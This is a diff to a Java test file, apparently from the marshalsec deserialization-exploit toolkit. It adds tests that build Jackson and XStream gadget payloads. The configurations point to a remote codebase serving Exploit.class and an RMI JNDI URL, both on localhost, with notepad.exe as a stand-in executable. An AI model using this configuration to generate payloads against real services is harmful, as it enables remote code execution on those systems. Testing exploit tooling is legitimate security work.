@@ -2,6 +2,8 @@ import java.util.Map;
 import marshalsec.Configuration;
 import marshalsec.EscapeType;
 import marshalsec.Jackson;
+import marshalsec.MarshalsecFactory;
+import marshalsec.XStream;
 import marshalsec.gadgets.GadgetType;
 import org.junit.Assert;
 import org.testng.annotations.Test;
@@ -14,13 +16,14 @@ import org.testng.annotations.Test;
 public class MarshalFactoryTest {
 
 	@Test
-	public void T01_runFactoryAllGadgets() throws Exception {
+	public void T01_runBaseMarshaller() throws Exception {
 
 		Configuration c = Configuration
 			.create()
 			.all(true)
-			.codebase("{exploit.codebase:http://localhost:8080/}")
-			.codebaseClass("{exploit.codebaseClass:Exploit}")
+			.codebase("http://localhost:31337/")
+			.codebaseClass("Exploit.class")
+			.JNDIUrl("rmi://localhost:1069/Exploit")
 			.escapeType(EscapeType.NONE)
 			.executable("C:\\Windows\\notepad.exe")
 			.gadgetType(GadgetType.SpringPropertyPathFactory)
@@ -31,6 +34,29 @@ public class MarshalFactoryTest {
 		jackson.run(c);
 
 		Map<GadgetType, String> payloads = jackson.getPayload();
+
+		if (payloads.isEmpty()) {
+			Assert.fail("No payloads generated");
+		}
+	}
+
+	@Test
+	public void T02_runMarshallerFactory() throws Exception {
+
+		Configuration c = Configuration
+			.create()
+			.all(true)
+			.codebase("http://localhost:31337/")
+			.codebaseClass("Exploit.class")
+			.JNDIUrl("rmi://localhost:1069/Exploit")
+			.escapeType(EscapeType.NONE)
+			.executable("C:\\Windows\\notepad.exe")
+			.gadgetType(GadgetType.SpringPropertyPathFactory)
+			.build();
+
+		MarshalsecFactory factory = new MarshalsecFactory(c);
+
+		Map payloads = factory.payload(new XStream());
 
 		if (payloads.isEmpty()) {
 			Assert.fail("No payloads generated");
